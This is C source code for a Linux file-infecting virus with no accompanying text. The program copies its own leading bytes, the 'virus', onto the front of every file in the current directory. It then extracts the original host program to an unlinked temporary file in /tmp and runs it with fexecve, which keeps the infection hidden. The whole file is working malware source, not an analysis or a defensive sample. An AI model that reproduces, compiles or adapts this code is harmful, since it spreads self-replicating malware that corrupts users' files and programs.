#ifndef __linux__
#error "Linux only"
#endif

#include <assert.h>
#include <errno.h>
#include <dirent.h>
#include <fcntl.h>
#include <limits.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/sendfile.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

static_assert(sizeof(size_t) >= sizeof(off_t), "off_t must fit in size_t");

#ifndef VIRUS_SIZE
#error "Please define VIRUS_SIZE"
#endif

enum {
    virus_size = VIRUS_SIZE,
};

static_assert(virus_size > 0, "VIRUS_SIZE must be positive");

typedef struct {
    char content[virus_size];
} virus_t;

size_t sendfile_all(int out_fd, int in_fd, size_t remaining) {
    while (remaining > 0) {
        ssize_t result = sendfile(out_fd, in_fd, NULL, remaining);
        if (result < 0) break;
        remaining -= result;
    }
    return remaining;
}

int infect(const virus_t *virus, const char *path) {
    int result = 0;

    int fd = open(path, O_RDWR);
    if (fd == -1) {
        result = errno;
        goto exit;
    }

    struct stat stat;
    if (fstat(fd, &stat)) {
        result = errno;
        goto close_fd;
    }

    result = posix_fallocate(fd, stat.st_size, virus_size);
    if (result) {
        goto close_fd;
    }

    off_t new_size = stat.st_size + virus_size;
    char *content = mmap(NULL, new_size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (content == MAP_FAILED) {
        result = errno;
        goto close_fd;
    }

    posix_madvise(content, new_size, POSIX_MADV_WILLNEED);
    memmove(content + virus_size, content, stat.st_size);
    posix_madvise(content, virus_size, POSIX_MADV_SEQUENTIAL);
    memcpy(content, virus, virus_size);
    
    {
        int result = munmap(content, new_size);
        assert(!result);
    }

close_fd:
    close(fd);

exit:
    return result;
}

int main(int argc, char *const argv[], char *const envp[]) {
    (void)argc;

    int exe_fd = open("/proc/self/exe", O_RDONLY);
    if (exe_fd == -1) {
        fprintf(stderr, "could not open /proc/self/exe for reading: %s\n", strerror(errno));
        goto exit;
    }

    struct stat exe_stat;
    if (fstat(exe_fd, &exe_stat)) {
        fprintf(stderr, "could not stat /proc/self/exe: %s\n", strerror(errno));
        goto close_exe;
    }
    assert(exe_stat.st_size >= virus_size);

    virus_t *virus = mmap(NULL, virus_size, PROT_READ, MAP_SHARED, exe_fd, 0);
    if (virus == MAP_FAILED) {
        fprintf(stderr, "cannot memory-map %zu-byte virus: %s\n", 
                (size_t) virus_size, strerror(errno));
    } else {
        DIR *dir = opendir(".");
        if (dir) {
            struct dirent entry;
            struct dirent *result;
            while (true) {
                int error = readdir_r(dir, &entry, &result); 
                assert(!error);
                if (!result) break;

                posix_madvise(virus, virus_size, POSIX_MADV_SEQUENTIAL);
                error = infect(virus, entry.d_name);
                if (error) {
                    fprintf(stderr, "cannot infect %s: %s\n", entry.d_name, strerror(error));
                }
            }
            closedir(dir);
        } else {
            fprintf(stderr, "cannot open .: %s\n", strerror(errno));
        }
        int error = munmap(virus, virus_size);
        assert(!error);
    }

    off_t actual_size = exe_stat.st_size - virus_size;
    if (actual_size == 0) {
        close(exe_fd);
        return 0;
    }

    char tmp_path[] = "/tmp/XXXXXX";
    int tmp_fd = mkstemp(tmp_path);
    if (tmp_fd == -1) {
        fprintf(stderr, "cannot create temporary file in /tmp: %s\n", strerror(errno));
        goto close_exe;
    }

    {
        int result = posix_fallocate(tmp_fd, 0, actual_size);
        if (result) {
            fprintf(stderr, "cannot allocate %zu bytes for %s: %s\n",
                    (size_t) actual_size, tmp_path, strerror(result));
            goto close_tmp;
        }
    }

    {
        int result = lseek(exe_fd, virus_size, SEEK_SET);
        assert(result != -1);
    }
    posix_fadvise(exe_fd, virus_size, actual_size, POSIX_FADV_SEQUENTIAL);
    posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
    {
        size_t remaining = sendfile_all(tmp_fd, exe_fd, actual_size);
        if (remaining > 0) {
            fprintf(stderr,
                    "cannot write remaining %zu of %zu bytes "
                    "from /proc/self/exe to %s: %s\n",
                    remaining, (size_t) actual_size, tmp_path, strerror(errno));
            goto close_tmp;
        }
    }

    {
        mode_t mode = ~S_IFMT & exe_stat.st_mode;
        int result = fchmod(tmp_fd, mode);
        if (result == -1) {
            fprintf(stderr, "cannot set permissions of %s to %o: %s\n",
                    tmp_path, (int) mode, strerror(errno));
            goto close_tmp;
        }
    }

    if (fsync(tmp_fd)) {
        fprintf(stderr, "cannot sync %s: %s\n", tmp_path, strerror(errno));
        goto close_tmp;
    }

    int tmp_fd2 = open(tmp_path, O_RDONLY);
    if (tmp_fd2 == -1) {
        fprintf(stderr, "cannot open %s for reading: %s\n", tmp_path, strerror(errno));
        goto close_tmp;
    }

    close(tmp_fd);
    unlink(tmp_path);
    close(exe_fd);
    fexecve(tmp_fd2, argv, envp);
    fprintf(stderr, "cannot execute %s: %s\n", tmp_path, strerror(errno));
    close(tmp_fd2);
    goto exit;

close_tmp:
    close(tmp_fd);
    unlink(tmp_path);

close_exe:
    close(exe_fd);
    
exit:
    return EXIT_FAILURE;
}
